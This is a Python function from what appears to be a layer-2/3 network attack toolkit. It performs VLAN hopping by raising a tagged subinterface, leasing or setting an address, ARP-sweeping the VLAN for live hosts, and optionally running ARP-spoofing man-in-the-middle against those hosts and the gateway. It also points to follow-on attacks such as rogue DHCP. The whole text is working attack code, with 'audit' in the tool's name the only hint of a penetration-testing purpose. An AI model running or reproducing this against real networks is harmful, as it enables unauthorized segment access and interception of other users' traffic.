def vlanhop_cmd(args):
    """Hijack a tagged VLAN: bring up IFACE.<vlan>, DHCP (or static) an
    address, enumerate it, optionally MITM. Lifecycle: create -> use ->
    (default) teardown."""
    need_root()
    pif = parent_of(args.iface)
    sub = dst = None
    created = False
    try:
        sub = vlan_up(pif, args.vlan)
        created = True
        print(f"[*] subinterface {sub} up (parent {pif}, 802.1Q id "
              f"{args.vlan})")
        if args.static:
            dst = args.static.split("/")[0]
            subprocess.run(["ip", "addr", "add", args.static, "dev", sub],
                           capture_output=True)
            print(f"[*] static address {args.static} on {sub}")
        else:
            dst, server = dhcp_discover_addr(sub, args.dhcp_timeout)
            if not dst:
                raise SystemExit(
                    f"[!] no DHCP lease in VLAN {args.vlan} "
                    f"({args.dhcp_timeout}s) - static? -> retry "
                    f"with --static <ip>/<bits>, else VLAN may be "
                    f"unreachable from this port")
            print(f"[!] LEASED {dst} from {server} in VLAN {args.vlan} - "
                  "bidirectional presence in the tagged VLAN proven")

        gw = args.gateway or gateway_of(sub)
        net = net_of(sub)
        alive = []
        if args.sweep and net:
            print(f"[*] ARP sweep of {net} inside VLAN {args.vlan}")
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net),
                         iface=sub, timeout=3, verbose=0)
            alive = sorted({r.psrc for s, r in ans
                            if r.psrc != dst})
            for s, r in ans:
                print(f"    {r.psrc:<16} {r.hwsrc}")
            print(f"[*] {len(ans)} hosts in VLAN {args.vlan}")
        if args.mitm:
            if not gw:
                die("no gateway known for MITM; pass --gateway")
            targets = [t for t in alive if t != gw] or [gw]
            print(f"[*] MITM in VLAN {args.vlan}: {len(targets)} target(s)"
                  f" <-> {gw} (Ctrl-C restores caches)")
            ns = argparse.Namespace(iface=sub, targets=targets[:args.max],
                                    gateway=gw)
            arpspoof_cmd(ns)
        else:
            print(f"[*] attack in-VLAN with -i {sub}, e.g. "
                  f"l2l3-audit -i {sub} arpspoof / roguedhcp / scan")
            print(f"[*] holding VLAN {args.vlan} presence "
                  f"({'persistent' if args.persist else 'Ctrl-C -> teardown'})")

            def hold(stopped):
                while not stopped():
                    time.sleep(1)
            stop_loop(hold)
    except KeyboardInterrupt:
        pass
    finally:
        if created and not args.persist:
            vlan_down(sub)
            print(f"[*] {sub} torn down")
        elif created and args.persist:
            print(f"[*] {sub} left up (--persist); teardown: "
                  f"ip link del {sub}")


